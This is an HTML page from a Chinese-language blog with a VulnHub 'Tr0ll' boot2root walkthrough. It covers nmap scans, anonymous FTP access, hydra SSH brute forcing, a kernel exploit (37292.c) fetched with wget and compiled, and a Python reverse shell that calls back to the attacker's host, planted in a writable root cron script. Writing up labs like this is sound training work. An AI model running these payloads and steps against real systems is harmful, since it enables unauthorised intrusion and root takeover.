@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>vulnhub: Tr0ll - Vampire blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta itemprop="name" content="vulnhub: Tr0ll">
+<meta itemprop="description" content="靶机介绍 该靶机类型为boot2root，最终目标获取root并且从/root目录中获取proof.txt。
+下载地址
+https://download.vulnhub.com/tr0ll/Tr0ll.rar 靶机运行 直接下载解压，使用VMware虚拟机打开即可，根据自己需求修改网络连接模式
+信息收集 探测靶机地址 nmap -sn 10.10.10.*
+root@kali:~# nmap -sn 10.10.10.* Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-22 21:23 EDT Nmap scan report for 10.10.10.1 Host is up (0.00042s latency). MAC Address: 00:50:56:C0:00:08 (VMware) Nmap scan report for 10.10.10.2 Host is up (0.00027s latency). MAC Address: 00:50:56:E3:59:BE (VMware) Nmap scan report for 10.10.10.143 Host is up (0.00019s latency). MAC Address: 00:0C:29:66:79:D0 (VMware) Nmap scan report for 10.">
+<meta itemprop="datePublished" content="2019-11-03T16:51:55&#43;08:00" />
+<meta itemprop="dateModified" content="2019-11-03T16:51:55&#43;08:00" />
+<meta itemprop="wordCount" content="751">
+
+
+
+<meta itemprop="keywords" content="boot2root," /><meta property="og:title" content="vulnhub: Tr0ll" />
+<meta property="og:description" content="靶机介绍 该靶机类型为boot2root，最终目标获取root并且从/root目录中获取proof.txt。
+下载地址
+https://download.vulnhub.com/tr0ll/Tr0ll.rar 靶机运行 直接下载解压，使用VMware虚拟机打开即可，根据自己需求修改网络连接模式
+信息收集 探测靶机地址 nmap -sn 10.10.10.*
+root@kali:~# nmap -sn 10.10.10.* Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-22 21:23 EDT Nmap scan report for 10.10.10.1 Host is up (0.00042s latency). MAC Address: 00:50:56:C0:00:08 (VMware) Nmap scan report for 10.10.10.2 Host is up (0.00027s latency). MAC Address: 00:50:56:E3:59:BE (VMware) Nmap scan report for 10.10.10.143 Host is up (0.00019s latency). MAC Address: 00:0C:29:66:79:D0 (VMware) Nmap scan report for 10." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://vampire-lab.github.io/posts/tr0ll/" />
+<meta property="article:published_time" content="2019-11-03T16:51:55+08:00" />
+<meta property="article:modified_time" content="2019-11-03T16:51:55+08:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="vulnhub: Tr0ll"/>
+<meta name="twitter:description" content="靶机介绍 该靶机类型为boot2root，最终目标获取root并且从/root目录中获取proof.txt。
+下载地址
+https://download.vulnhub.com/tr0ll/Tr0ll.rar 靶机运行 直接下载解压，使用VMware虚拟机打开即可，根据自己需求修改网络连接模式
+信息收集 探测靶机地址 nmap -sn 10.10.10.*
+root@kali:~# nmap -sn 10.10.10.* Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-22 21:23 EDT Nmap scan report for 10.10.10.1 Host is up (0.00042s latency). MAC Address: 00:50:56:C0:00:08 (VMware) Nmap scan report for 10.10.10.2 Host is up (0.00027s latency). MAC Address: 00:50:56:E3:59:BE (VMware) Nmap scan report for 10.10.10.143 Host is up (0.00019s latency). MAC Address: 00:0C:29:66:79:D0 (VMware) Nmap scan report for 10."/>
+<link href='https://fonts.googleapis.com/css?family=Playfair+Display:700' rel='stylesheet' type='text/css'>
+	<link rel="stylesheet" type="text/css" media="screen" href="https://vampire-lab.github.io/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="https://vampire-lab.github.io/css/main.css" />
+
+        <link id="dark-scheme" rel="stylesheet" type="text/css" href="https://vampire-lab.github.io/css/dark.css" />
+
+	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+		<script src="https://vampire-lab.github.io/js/main.js"></script>
+</head>
+
+<body>
+	<div class="container wrapper">
+		<div class="header">
+	
+		<div class="avatar">
+			<a href="https://vampire-lab.github.io/">
+				<img src="/images/im/t.png" alt="Vampire blog" />
+			</a>
+		</div>
+	
+	<h1 class="site-title"><a href="https://vampire-lab.github.io/">Vampire blog</a></h1>
+	<div class="site-description"><p>不去想是否能够成功,既然选择了远方,便只顾风雨兼程。</p><nav class="nav social">
+			<ul class="flat"><li><a href="https://github.com/vampire-lab" title="Github"><i data-feather="github"></i></a></li><li><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></li></ul>
+		</nav><span class="scheme-toggle"><a href="#" id="scheme-toggle"></a></div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Home</a>
+			</li>
+			
+			<li>
+				<a href="/posts">All posts</a>
+			</li>
+			
+			<li>
+				<a href="/about">About</a>
+			</li>
+			
+			<li>
+				<a href="/tags">Tags</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post">
+			<div class="post-header">
+				
+					<div class="meta">
+						<div class="date">
+							<span class="day">03</span>
+							<span class="rest">Nov 2019</span>
+						</div>
+					</div>
+				
+				<div class="matter">
+					<h1 class="title">vulnhub: Tr0ll</h1>
+				</div>
+			</div>
+					
+			<div class="markdown">
+				<h3 id="靶机介绍">靶机介绍</h3>
+<p>该靶机类型为boot2root，最终目标获取root并且从/root目录中获取proof.txt。</p>
+<p>下载地址</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">https://download.vulnhub.com/tr0ll/Tr0ll.rar
+</code></pre></div><h3 id="靶机运行">靶机运行</h3>
+<p>直接下载解压，使用VMware虚拟机打开即可，根据自己需求修改网络连接模式</p>
+<p><img src="/images/2019/tr0ll/d17c942b7ac3f21f89a719275a41ec6f.png" alt="d17c942b7ac3f21f89a719275a41ec6f.png"></p>
+<h3 id="信息收集">信息收集</h3>
+<p>探测靶机地址 nmap -sn 10.10.10.*</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@kali:~# nmap -sn 10.10.10.*
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-22 21:23 EDT
+Nmap scan report for 10.10.10.1
+Host is up (0.00042s latency).
+MAC Address: 00:50:56:C0:00:08 (VMware)
+Nmap scan report for 10.10.10.2
+Host is up (0.00027s latency).
+MAC Address: 00:50:56:E3:59:BE (VMware)
+Nmap scan report for 10.10.10.143
+Host is up (0.00019s latency).
+MAC Address: 00:0C:29:66:79:D0 (VMware)
+Nmap scan report for 10.10.10.254
+Host is up (0.00018s latency).
+MAC Address: 00:50:56:FA:BF:AA (VMware)
+Nmap scan report for 10.10.10.132
+Host is up.
+Nmap done: 256 IP addresses (5 hosts up) scanned in 3.33 seconds
+</code></pre></div><p>发现存活地址10.10.10.143为靶机地址，全端口扫描，通过扫描结果可以看到靶机开放了21、22、80端口，通过返回的信息知道ftp存在匿名访问漏洞</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@kali:~# nmap -p- -sV -A 10.10.10.143
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-22 21:24 EDT
+Nmap scan report for 10.10.10.143
+Host is up (0.00085s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.2
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 10.10.10.132
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 600
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.2 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
+|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
+|   256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
+|_  256 b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 (ED25519)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry
+|_/secret
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Site doesn&#39;t have a title (text/html).
+MAC Address: 00:0C:29:66:79:D0 (VMware)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.85 ms 10.10.10.143
+
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.06 seconds
+</code></pre></div><p>首先访问一下web服务，发现没有什么东西，源码也无有用的信息
+http://10.10.10.143</p>
+<p><img src="/images/2019/tr0ll/06b2a96d99e76ad0e6b5e6bd17fbeee1.png" alt="06b2a96d99e76ad0e6b5e6bd17fbeee1.png"><img src="/images/2019/tr0ll/7c18974ab97de1558744e0b00da176fa.png" alt="7c18974ab97de1558744e0b00da176fa.png"></p>
+<p>使用dirsearch工具扫描一下目录，发现存在robots.txt和/secret/文件</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@kali:/opt/dirsearch# python3 dirsearch.py -u http://10.10.10.143/ -e *
+
+
+_|. _ _  _  _  _ _|_    v0.3.8
+(_||| _) (/_(_|| (_| )
+
+
+Extensions: CHANGELOG.md | HTTP method: get | Threads: 10 | Wordlist size: 6099
+
+
+Error Log: /opt/dirsearch/logs/errors-19-10-23_03-10-52.log
+
+
+Target: http://10.10.10.143/
+
+
+[03:10:52] Starting:
+......
+......
+[03:11:00] 200 -   36B  - /index.html
+[03:11:04] 200 -   31B  - /robots.txt
+[03:11:04] 301 -  312B  - /secret  -&gt;  http://10.10.10.143/secret/
+[03:11:04] 200 -   37B  - /secret/
+[03:11:04] 403 -  292B  - /server-status
+[03:11:04] 403 -  293B  - /server-status/
+</code></pre></div><p>访问一下http://10.10.10.143/secret/ 和http://10.10.10.143/robots.txt 都没有什么有用的信息</p>
+<p><img src="/images/2019/tr0ll/94ab60d5b3dacee1960324f1782b0c8a.png" alt="94ab60d5b3dacee1960324f1782b0c8a.png"><img src="/images/2019/tr0ll/12861c8511e33dea6b84457d85b36d3b.png" alt="12861c8511e33dea6b84457d85b36d3b.png"><img src="/images/2019/tr0ll/8d7ae391cbd7c8ebe7da6a8be977b402.png" alt="8d7ae391cbd7c8ebe7da6a8be977b402.png"></p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<p>ftp存在匿名访问问题，看看有什么东西，发现存在lol.pcap数据包文件，使用get下载到本地</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@kali:~# ftp 10.10.10.143
+Connected to 10.10.10.143.
+220 (vsFTPd 3.0.2)
+Name (10.10.10.143:root): ftp
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap
+226 Directory send OK.
+ftp&gt; get lol.pcap /opt/lol.pcap
+local: /opt/lol.pcap remote: lol.pcap
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
+226 Transfer complete.
+8068 bytes received in 0.00 secs (62.0504 MB/s)
+</code></pre></div><p>使用wireshark打开，查找有用的信息，在数据包上右键追踪流-&gt;TCP流，发现存在secret_stuff.txt字符串</p>
+<p><img src="/images/2019/tr0ll/517ec42a0f1b6f0b639a87d9f25c5ca4.png" alt="517ec42a0f1b6f0b639a87d9f25c5ca4.png"></p>
+<p>使用ctrl+f搜索secret_stuff.txt，找到其中文本内容</p>
+<p><img src="/images/2019/tr0ll/e6fbdf351b27a2d252a311bdc0a1c552.png" alt="e6fbdf351b27a2d252a311bdc0a1c552.png"></p>
+<p>右键选择导出分组字节流</p>
+<p><img src="/images/2019/tr0ll/45ba0677e1fc12da9c4fe1130c654504.png" alt="45ba0677e1fc12da9c4fe1130c654504.png"></p>
+<p>保存到本地，打开文本</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Well, well, well, aren&#39;t you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P
+</code></pre></div><p>看起来可能是目录名，直接访问http://10.10.10.143/sup3rs3cr3tdirlol/，发现一个文件，下载下来</p>
+<p><img src="/images/2019/tr0ll/b6890242fbdf39b1f8bbb1e7097973a2.png" alt="b6890242fbdf39b1f8bbb1e7097973a2.png"></p>
+<p>查看一下文件类型，看起来是个可执行文件</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@kali:~/Downloads# file roflmao
+roflmao: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=5e14420eaa59e599c2f508490483d959f3d2cf4f, not stripped
+</code></pre></div><p>不太懂linux文件，只好给权限执行看看结果了，获取到一个十六进制字符串，感觉可能是目录</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@kali:~/Downloads# chmod u+x roflmao
+root@kali:~/Downloads# ./roflmao
+root@kali:~/Downloads# ./roflmao
+Find address 0x0856BF to proceedr
+</code></pre></div><p>直接访问http://10.10.10.143/0x0856BF/，可以访问存在两个文件夹</p>
+<p><img src="/images/2019/tr0ll/14570b481fde93260813d8526bf7889d.png" alt="14570b481fde93260813d8526bf7889d.png"></p>
+<p>发现其中一个存在用户名，另一个密码文件只有Good_job_:)内容，感觉是假的。。</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">which_one_lol.txt
+maleus
+ps-aux
+felux
+Eagle11
+genphlux &lt; -- Definitely not this one
+usmc8892
+blawrg
+wytshadow
+vis1t0r
+overflow
+
+Pass.txt
+Good_job_:)
+</code></pre></div><p>使用hydra跑了一下，失败了，Good_job_:)这个密码不对，文件夹提示密码在这个文件夹中，那有可能Pass.txt就是密码，再跑一次，密码正确</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@kali:/opt/pass# hydra -L username.txt -p Pass.txt   ssh://10.10.10.143
+</code></pre></div><p><img src="/images/2019/tr0ll/c6144185160d79ccac4ee0b6981ea76b.png" alt="c6144185160d79ccac4ee0b6981ea76b.png"></p>
+<p>连接ssh，登陆到靶机，登陆成功</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ssh overflow@10.10.10.143
+</code></pre></div><p><img src="/images/2019/tr0ll/edf9af08dcdf921fad21fc6e6e255a8b.png" alt="edf9af08dcdf921fad21fc6e6e255a8b.png"></p>
+<h3 id="提权">提权</h3>
+<h4 id="第一种提权方式">第一种提权方式</h4>
+<p>查看一下当前内核版本</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">uname -a
+</code></pre></div><p><img src="/images/2019/tr0ll/4dcbd9a3afe3b4e7fc7eab26ea5d0206.png" alt="4dcbd9a3afe3b4e7fc7eab26ea5d0206.png"></p>
+<p>在kali下使用searchsploit 3.13.0命令搜索相关利用代码，找到37292.c</p>
+<p><img src="/images/2019/tr0ll/2d5ab151a4298c3bd639f011b9cd305c.png" alt="2d5ab151a4298c3bd639f011b9cd305c.png"></p>
+<p>将exp拷贝到当前目录，搭建服务器，通过靶机访问下载exp</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">cp /usr/share/exploitdb/exploits/linux/local/37292.c /opt/
+</code></pre></div><p>在exp所在目录下使用python3 -m http.server开启web服务，然后在靶机上使用wget http://10.10.10.132:8000/37292.c（该地址为kali架设web服务地址） 下载exp</p>
+<p><img src="/images/2019/tr0ll/7ef0825898cbcfe89fca359a1463bcec.png" alt="7ef0825898cbcfe89fca359a1463bcec.png"></p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cd /tmp
+$ ls
+$ wget http://10.10.10.132:8000/37292.c
+--2019-10-23 00:56:59--  http://10.10.10.132:8000/37292.c
+Connecting to 10.10.10.132:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5119 (5.0K) [text/plain]
+Saving to: ‘37292.c’
+
+
+100%[===============================&gt;] 5,119       --.-K/s   in 0s      
+
+
+2019-10-23 00:56:59 (234 MB/s) - ‘37292.c’ saved [5119/5119]
+
+
+$ ls
+37292.c
+$
+
+</code></pre></div><p>使用gcc在tmp文件夹下编译37292.c文件，执行./exp文件，查看当前用户，提权成功（编译的时候要快一点，靶机的tmp看起来会自动清除文件）</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ gcc 37292.c -o exp
+$ ls
+37292.c  a.out    exp
+$ ./exp
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# whoami
+root
+</code></pre></div><p>最后读取/root下的 proof.txt</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># cat /root/proof.txt
+Good job, you did it!
+
+
+
+
+702a8c18d29c6f3ca0d99ef5712bfbdc
+
+</code></pre></div><h4 id="第二种提权方式">第二种提权方式</h4>
+<p>由于靶机年代久远，可能当时没有相关exp，而是设置了其他提权方式，登陆shell会定时踢出，可能存在什么定时任务，首先查看一下定时任务配置文件crontab，看起来是没有权限</p>
+<p><img src="/images/2019/tr0ll/88ae1c85b2c136d0b519c5ed2bc4c6ee.png" alt="88ae1c85b2c136d0b519c5ed2bc4c6ee.png"></p>
+<p>我们去查看一下cron的log文件，使用命令cat /var/log/cronlog 发现一个定时执行的脚本</p>
+<p><img src="/images/2019/tr0ll/a07faca8f347be5f8286ca1392ad9096.png" alt="a07faca8f347be5f8286ca1392ad9096.png"></p>
+<p>不清楚该文件在哪可以使用find / -name cleaner.py，找到该文件，前面的报错不用管，因为查找所有文件</p>
+<p><img src="/images/2019/tr0ll/a07faca8f347be5f8286ca1392ad9096.png" alt="573a43a26799e9f89b5d68150279096c.png"></p>
+<p>该文件为root权限，并且其权限为777，可以通过该脚本执行反弹命令，即可获取root权限</p>
+<p><img src="/images/2019/tr0ll/a02de7ff37b4c31b16b812f40c191c8a.png" alt="a02de7ff37b4c31b16b812f40c191c8a.png"></p>
+<p>既然是python脚本，那就使用python反弹代码尝试一下</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((&#34;10.10.10.132&#34;,8088))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;])
+
+</code></pre></div><p>将脚本名称命名为cleaner.py，然后使用python3 -m http.server在kali上搭建一个http服务，使用靶机下载脚本
+进入到靶机的/tmp目录下，然后执行wget http://10.10.10.132:8000/cleaner.py进行下载</p>
+<p><img src="/images/2019/tr0ll/42adf71457fc42371db6e1dcb916cde1.png" alt="42adf71457fc42371db6e1dcb916cde1.png"></p>
+<p>将该文件内容重定向到到/lib/log/cleaner.py脚本中进行覆盖</p>
+<p><img src="/images/2019/tr0ll/c3fa07694e859d0fbba82c9f2dab01fc.png" alt="c3fa07694e859d0fbba82c9f2dab01fc.png"></p>
+<p>执行nc -lvvp 8088 等待连接</p>
+<p><img src="/images/2019/tr0ll/140f5214111fa04146ed1006c08259f6.png" alt="140f5214111fa04146ed1006c08259f6.png"></p>
+<p>反弹成功，查看当前权限，为root权限</p>
+<p><img src="/images/2019/tr0ll/11b22ddb8d347d2c0709facb6d697c2a.png" alt="11b22ddb8d347d2c0709facb6d697c2a.png"></p>
+<p>提权成功</p>
+
+			</div>
+
+			<div class="tags">
+				
+					
+						<ul class="flat">
+							
+							<li><a href="/tags/boot2root">boot2root</a></li>
+							
+						</ul>
+					
+				
+			</div>
+
+
+		</div>
+	</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div>2019  © Copyright notice |  <a href="https://github.com/knadh/hugo-ink">Ink</a> theme on <a href="https://gohugo.io">Hugo</a></div>
+	</nav>
+</div>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-123-45', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<script>feather.replace()</script>
+</body>
+</html>
